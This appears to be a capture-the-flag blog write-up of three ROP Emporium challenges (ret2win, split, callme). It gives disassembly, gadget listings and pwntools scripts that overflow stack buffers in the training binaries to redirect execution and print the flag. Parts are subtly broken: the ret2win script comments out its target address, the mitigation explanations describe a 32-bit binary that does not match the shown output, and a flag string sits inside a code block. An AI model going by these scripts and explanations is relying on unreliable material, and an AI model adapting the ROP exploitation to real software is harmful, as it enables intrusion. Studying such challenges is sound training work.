---
title: ROPEMPORIUM
date: 2023-06-04 18:05:40 +/-TTTT
categories: [ctf, ROPEMPORIUM]
tags: [ctf]     # TAG names should always be lowercase
---

# Introduction

You already know this bit
Return-oriented programming (ROP) is a mechanism that can be leveraged to bypass exploit mitigation schemes such as NX/DEP. For some background on the subject you can check out the `Wikipedia` page. 

# Why you're here

ROP Emporium provides a series of challenges that are designed to teach ROP in isolation, with minimal requirement for reverse-engineering or bug hunting. Each challenge introduces a new concept with slowly increasing complexity. Follow the links on the homepage to see exercise descriptions and the challenge binaries. Sometimes a few clues as to how you might go about solving a challenge are included, but there aren't any spoilers.

`Let's Go to the challenge`

# Ret2win

- -> `Identify file` : 
```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```
The binary is a `ELF executable` for 64-bit architecture. As expected

Now I will verify the security of this binary file, by doing :

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

* `Arch` : i386-32-little: This means this is a 32-bit binary compiled on a little-endian system.

* `RELRO` : Partial RELRO: A detailed explanation on what RELRO is can be found here.

* `Stack` : No canary found: Stack canaries are a feature that programs can use to protect against buffer overflows. More information here.

* `NX` : NX enabled: NX means Not Executable. This just means that the stack is not executable, meaning we can’t just place our own malicious shellcode on the stack and execute it.

* `PIE` : No PIE (0x8048000): PIE means Position Independent Executable. PIE being enabled is synonymous with ASLR being enabled. More information about PIE (and by extension, ASLR) can be found here.

Afterward, I decided to run the program and see its behavior.
The program somewhat ask if we can break the program and overflow the buffer. Okay, let’s move on and try to get the flag!.

let's analyze 

There are three interesting functions namely `main, pwnme, and ret2win`.

the following `disassamble main` : 

```js
; DATA XREF from entry0 @ 0x4005cd(r)
┌ 81: int main (int argc, char **argv, char **envp);
│           0x00400697      55             push rbp
│           0x00400698      4889e5         mov rbp, rsp
│           0x0040069b      488b05b60920.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x601058:8]=0
│           0x004006a2      b900000000     mov ecx, 0                  ; size_t size
│           0x004006a7      ba02000000     mov edx, 2                  ; int mode
│           0x004006ac      be00000000     mov esi, 0                  ; char *buf
│           0x004006b1      4889c7         mov rdi, rax                ; FILE*stream
│           0x004006b4      e8e7feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x004006b9      bf08084000     mov edi, str.ret2win_by_ROP_Emporium ; 0x400808 ; "ret2win by ROP Emporium" ; const char *s
│           0x004006be      e88dfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006c3      bf20084000     mov edi, str.x86_64_n       ; 0x400820 ; "x86_64\n" ; const char *s
│           0x004006c8      e883feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006cd      b800000000     mov eax, 0
│           0x004006d2      e811000000     call sym.pwnme
│           0x004006d7      bf28084000     mov edi, str._nExiting      ; 0x400828 ; "\nExiting" ; const char *s
│           0x004006dc      e86ffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006e1      b800000000     mov eax, 0
│           0x004006e6      5d             pop rbp
└           0x004006e7      c3             ret
```

`Disassemble pwnme` :

```js
; CALL XREF from main @ 0x4006d2(x)
┌ 110: sym.pwnme ();
│           ; var void *buf @ rbp-0x20
│           0x004006e8      55             push rbp
│           0x004006e9      4889e5         mov rbp, rsp
│           0x004006ec      4883ec20       sub rsp, 0x20
│           0x004006f0      488d45e0       lea rax, [buf]
│           0x004006f4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004006f9      be00000000     mov esi, 0                  ; int c
│           0x004006fe      4889c7         mov rdi, rax                ; void *s
│           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x00400706      bf38084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_56_bytes_of_user_input_into_32_bytes_of_stack_buffer_ ; 0x400838 ; "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!" ; const char *s
│           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400710      bf98084000     mov edi, str.What_could_possibly_go_wrong_ ; 0x400898 ; "What could possibly go wrong?" ; const char *s
│           0x00400715      e836feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040071a      bfb8084000     mov edi, str.You_there__may_I_have_your_input_please__And_dont_worry_about_null_bytes__were_using_read____n ; 0x4008b8 ; "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n" ; const char *s
│           0x0040071f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400724      bf18094000     mov edi, 0x400918           ; "> " ; const char *format
│           0x00400729      b800000000     mov eax, 0
│           0x0040072e      e83dfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400733      488d45e0       lea rax, [buf]
│           0x00400737      ba38000000     mov edx, 0x38               ; '8' ; 56 ; size_t nbyte
│           0x0040073c      4889c6         mov rsi, rax                ; void *buf
│           0x0040073f      bf00000000     mov edi, 0                  ; int fildes
│           0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00400749      bf1b094000     mov edi, str.Thank_you_     ; 0x40091b ; "Thank you!" ; const char *s
│           0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400753      90             nop
│           0x00400754      c9             leave
└           0x00400755      c3             ret

```

`Disassemble ret2win` :

```js
│           0x00400756      55             push rbp
│           0x00400757      4889e5         mov rbp, rsp
│           0x0040075a      bf26094000     mov edi, str.Well_done__Heres_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
│           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
│           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0040076e      90             nop
│           0x0040076f      5d             pop rbp
└           0x00400770      c3             ret

```

It looks like the `main` function calls the `pwnme` and there is where we get the input from the user. It is also possible to see in this function that they are creating a buffer with size `0x20 (32 in decimal)` and then with the read function they ask the user some input and write it into the buffer, the problem here is that they write `0x38 bytes (56 in decimal)` from the standard input into the buffer, and obviously, `56 is greater than `32 making this a normal buffer overflow scenario.

Also, it is in the ret2win function that we can get the flag, look at the `bin_cat_flag.txt`. This will print the contents of flag.txt to the screen.

Now that we have the content of the `RSP register`, all it is left us to do to be able to find the offset `40 bytes`.

In this case, as stated in the `ret2win` page you have to add an additional return because the MOVAPS issue. In Ubuntu 18.04 and up the stack might be misaligned after segfaulting.

Knowing this I decided to try padding the `ROP chain` with an extra `ret`. To do that I just needed to find the correct address of a ret, a `ROP gadget`. 

For that I used the tool ROPgadget : 

* `ROPgadget --binary ./ret2win --ropchain`

```js
Gadgets information
============================================================
0x000000000040060e : adc byte ptr [rax], ah ; jmp rax
0x00000000004005d9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
...
...
0x0000000000400690 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400620
0x000000000040053e : ret   <-------- We need this address
0x0000000000400542 : ret 0x200a
0x0000000000400608 : sal byte ptr [rbp + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax
0x000000000040064a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax
0x0000000000400535 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004007ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400534 : test eax, eax ; je 0x40053a ; call rax
0x0000000000400533 : test rax, rax ; je 0x40053a ; call rax

Unique gadgets found: 94

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

    [-] Can't find the 'mov qword ptr [r64], r64' gadget
```

As you can see in the output above we have a return ROP gadget in the address : `0x000000000040053e`

# Script 

```python
from pwn import *

elf = ELF('ret2win')

p = process(elf.path)

#Prepare the payload
payload = b"A"*40                   #creates the junk part of the payload
payload += p64(0x40053e)            #ret address ROP chain. Necessary because we are in Ubuntu 20.04 64bits
# payload += p64(elf.symbols.ret2win) #address to ret2win() function

# Send the payload
p.sendline(payload)                 #send the payload to the process

r = p.recvall()              #gets all messages in the process
print(re.search("(ROPE{.*?})",r.decode()))
```

# SPLIT

This level takes it up a notch, and has us set up the stack such that we call system() ourselves and supply our own argument of `/bin/cat flag.txt`.

- -> `Identify file` :

```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

The binary is a `ELF executable` for 64-bit architecture. As expected

Looking at the important bit, we see three functions now. We can assume `main()` calls `pwnme()` as that’s the theme the challenges take. 

Let’s check `pwnme()` :

```js
│           ; var void *buf @ rbp-0x20
│           0x004006e8      55             push rbp
│           0x004006e9      4889e5         mov rbp, rsp
│           0x004006ec      4883ec20       sub rsp, 0x20
│           0x004006f0      488d45e0       lea rax, [buf]
│           0x004006f4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004006f9      be00000000     mov esi, 0                  ; int c
│           0x004006fe      4889c7         mov rdi, rax                ; void *s
│           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x00400706      bf10084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x400810 ; "Contriving a reason to ask user for data..." ; const char *s
│           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400710      bf3c084000     mov edi, 0x40083c           ; "> " ; const char *format
│           0x00400715      b800000000     mov eax, 0
│           0x0040071a      e851feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040071f      488d45e0       lea rax, [buf]
│           0x00400723      ba60000000     mov edx, 0x60               ; '`' ; 96 ; size_t nbyte
│           0x00400728      4889c6         mov rsi, rax                ; void *buf
│           0x0040072b      bf00000000     mov edi, 0                  ; int fildes
│           0x00400730      e85bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00400735      bf3f084000     mov edi, str.Thank_you_     ; 0x40083f ; "Thank you!" ; const char *s
│           0x0040073a      e811feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040073f      90             nop
│           0x00400740      c9             leave
└           0x00400741      c3             ret
```

 It is also possible to see in this function that they are `creating a buffer with size 0x20 (32 in decimal)` and then with the read function they ask the user some input and write it into the buffer, the problem here is that they `write 0x60 bytes (96 in decimal)` from the standard input into the buffer, and obviously, `96 is greater than 32` making this a normal buffer overflow scenario.

In the usefulFunction we have system call in the `address 0x0040074b` that we can use to get the flag.

```js
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

Now we have the the address of the /bin/cat flag.txt that would help us to get the flag. The idea is this, we want to jump to the address with the /bin/cat flag.txt and than to the address in the usefulFunction that performs the `system()` call. Executing the `/bin/cat flag.txt` command.

However, we still need to consider two things, first we do not know the offset buffer overflow value. And second, we are in a `64-bit architecture` and, as you know the stack is different in 64-bit when compared with the 3`2-bit architecture`. We need to analyze the stack for both architectures, to cover our basis.

From the challenge description : `You can do the x86 challenge with just a 2 link chain and the x86_64 challenge with a 3 link chain.` We need a 3 link chain for 64bit because of the way values are passed to functions and how the registers are placed in the stack in each architecture. 

| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
|---------|------|------|------|------|------|------|
| %eax    | %ebx | %ecx | %edx | %esi | %edi | %ebp |

Therefore, for the `32 bit` version we do not need to use registers to pass arguments to functions, just the stack, so this would be the `rop chain` :  

* `Rantai ROP = offset_padding + system_addr + bin_cat_command`

In `0x86_64 (64bits)` the function parameters are passed to functions via registers.

| syscall | arg0  | arg1  | arg2  | arg3  | arg4 | arg5 |
|---------|-------|-------|-------|-------|------|------|
| %rax    | %rdi  | %rsi  | %rdx  | %rcx  | %r8  | %r9  |

Reference : 
https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

In this case, since we want to `call system()` with the address to the string `/bin/cat flag.txt`, we have to first put this `address into rdi before calling system()`.

We need to find a ROP gadget that does a pop rdi ; ret.  

* `ROPgadget --binary ./split --ropchain | grep "pop rdi ; ret"`

As you can see in the output above we have a pop rdi ; ret ROP gadget in the address: `0x00000000004007c3`.  

And the ROP chain for 64bits is :  

* `ROP chain = offset_padding + pop_rdi_ret_gadget + bin_cat_command + system_addr`  

Now we just need to find the buffer overflow offset.

Now that we have the content of the RSP register, all it is left us to do to be able to find the `offset 40`

Now that we have the offset, the extra `pop rdi ; ret address (for 64bit users)`, the address for the `/bin/cat flag.txt` and the usefulFunction system call address (which is the function that we want to `jump` to because is the one that is going to execute the previously inject command to get us th flag) we are ready to create our exploit.

this script, I start by using the ELF functions to encapsulate the information about the ELF file given as an argument, the split in our case. Then, I created a process p that is responsible to launch the ELF file in the path, which is given as an argument. After this initialization process, it is time to create the payload.  

The idea is simple. We simply have to first add `the junk (a 40 bytes long random array of characters, in our case A)`. After this, because I am in a 64bit architecture I had to pass the argument `(/bin/call flag.txt)` to the system call in a register, to do so I added a `pop rdi ; ret ROPgadget address`, the one we discovered in step 5. Afterward, I had to add the system() call address in the `usefulFunction` to the payload. Making it like this:  

* `payload = 40 bytes of junk + pop_rdi_ret_address + bin_cat_address + system_call_address`

# Script

```python
from pwn import *

elf = ELF('split')                  #context.binary

p = process(elf.path)

#Prepare the payload
payload = b"A"*40                   #creates the junk part of the payload
payload += p64(0x4007c3)            #pop rdi ; ret address ROP chain. Necessary because we are 64bits
payload += p64(0x601060)            #The /bin/cat flag.txt
payload += p64(0x40074b)            #address to system call in usefulFunction

# Send the payload

print(payload)
p.sendline(payload)                 #send the payload to the process

response = p.recvall()              #gets all messages in the process
print(re.search("(ROPE{.*?})",response.decode()))

ROPE{a_placeholder_32byte_flag!}
```

# callme
For this challenge, the description tells us we have to call `callme_one(1, 2, 3), callme_two(1, 2, 3) and callme_three(1, 2, 3)`, in that order, to get the flag.

From the description:  

You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe, 0xd00df00d` e.g. callme_one`(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag`. 

For the x86_64 binary double up those values, e.g. 
callme_one`(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

 we need to first understand the buffer overflow offset, and also we need a way to pass the arguments to the functions, to do so we need ROP gadget with three register pops followed by a ret.

`The pwnme function` :

 ```js
           ; var void *buf @ rbp-0x20
│           0x00400898      55             push rbp
│           0x00400899      4889e5         mov rbp, rsp
│           0x0040089c      4883ec20       sub rsp, 0x20
│           0x004008a0      488d45e0       lea rax, [buf]
│           0x004008a4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004008a9      be00000000     mov esi, 0                  ; int c
│           0x004008ae      4889c7         mov rdi, rax                ; void *s
│           0x004008b1      e84afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x004008b6      bff0094000     mov edi, str.Hope_you_read_the_instructions..._n ; 0x4009f0 ; "Hope you read the instructions...\n" ; const char *s
│           0x004008bb      e810feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004008c0      bf130a4000     mov edi, 0x400a13           ; '\x13\n@' ; "> " ; const char *format
│           0x004008c5      b800000000     mov eax, 0
│           0x004008ca      e811feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004008cf      488d45e0       lea rax, [buf]
│           0x004008d3      ba00020000     mov edx, 0x200              ; 512 ; size_t nbyte
│           0x004008d8      4889c6         mov rsi, rax                ; void *buf
│           0x004008db      bf00000000     mov edi, 0                  ; int fildes
│           0x004008e0      e82bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x004008e5      bf160a4000     mov edi, str.Thank_you_     ; 0x400a16 ; "Thank you!" ; const char *s
│           0x004008ea      e8e1fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004008ef      90             nop
│           0x004008f0      c9             leave
└           0x004008f1      c3             ret
 ```

The main function calls the pwnme and here is where we get the input from the user. It is also possible to see in this function that they are `creating a buffer with size 0x20 (32 in decimal)` and then with the read function they ask the user some input and write it into the buffer, the problem here is that they `write 0x200 bytes (512 in decimal)` from the standard input into the buffer, and obviously, 512 is greater than 32 making this a normal buffer overflow scenario. 

Now that we have the content of the RSP register, all it is left us to do to be able to find the offset `40 bytes`

As you probably know, in the `64bit architecture` the values are passed to functions using `registers`, and the 64bit stack is as such :

| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
|---------|------|------|------|------|------|------|
|  %rax   | %rdi | %rsi | %rdx | %rcx | %r8  | %r9  |

Therefore, for the 64 bit version we need to use registers to pass arguments to functions, and because we just need to pass three, which is given in the challenge description, we need to use a ROP dadget that pops three registers and then as a ret. It is important to point out that the one thing that we must be aware to be able to choose the correct ROP gadget is that the ESP must be moved towers higher address in the ROP gadget, so by looking at the stack we need to go from left to right. One example would be : `pop rdi ; pop rsi ; pop rdx ; ret`. 

```js
Gadgets information
============================================================
0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009a0 : pop r14 ; pop r15 ; ret
0x00000000004009a2 : pop r15 ; ret
0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c8 : pop rbp ; ret
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret <---------
0x00000000004009a3 : pop rdi ; ret
0x000000000040093e : pop rdx ; ret
0x00000000004009a1 : pop rsi ; pop r15 ; ret
0x000000000040093d : pop rsi ; pop rdx ; ret
0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006be : ret

Unique gadgets found: 14
```

In this script, I start by using the ELF functions to encapsulate the information about the ELF file given as an argument, the callme in our case. Then, I created a process p that is responsible to launch the ELF file in the path, which is given as an argument. After this initialization process, it is time to create the payload.  

The idea is simple. We simply have to first add the junk `(a 40 bytes long random array of characters, in our case A)`. After this, because we have to pass three arguments to each function I assigned 3 variables the respective arguments (as you can see in arg0, arg1 and arg2) and I created a variable with the `pop rdi ; pop rsi ; pop rdx ; ret address` previously found.   After having these variables assigned we needed to get the address for `the functions callme_one, callme_two and callme_three`. After this I decided to create a `get_args variable` that basically added the registers to the functions. I did this because each function will have to receive the same three arguments in the same order.  

Now all I had left to do is write the final payload, which is as such :  

get_args = pop_rdi_rsi_rdx_ret_address + arg0 + arg1 + arg2

* `payload = 40 bytes of junk + get_args + callme_one_address + get_args + callme_two_address + get_args + callme_three_address`

# SCRIPT 

```py
from pwn import *

elf = ELF('callme')                             #context.binary

p = process(elf.path)

#Prepare the payload
junk = b"A"*40                                  #creates the junk part of the payload
arg0 = p64(0xdeadbeefdeadbeef)                  
arg1 = p64(0xcafebabecafebabe)                  
arg2 = p64(0xd00df00dd00df00d)                  

callme_one = p64(0x400720)                      #address of callme_one
callme_two = p64(0x400740)                      #address of callme_two
callme_three = p64(0x4006f0)                    #address of callme_three  

pop_rdi_rsi_rdx_ret = p64(0x40093c)             #address of pop rdi ; pop rsi ; pop rdx ; ret

get_args = pop_rdi_rsi_rdx_ret + arg0 + arg1 + arg2

payload = junk + get_args + callme_one + get_args + callme_two + get_args + callme_three


# Send the payload
p.sendline(payload)                 #send the payload to the process

response = p.recvall()              #gets all messages in the process
print(re.search("(ROPE{.*?})",response.decode()))
```
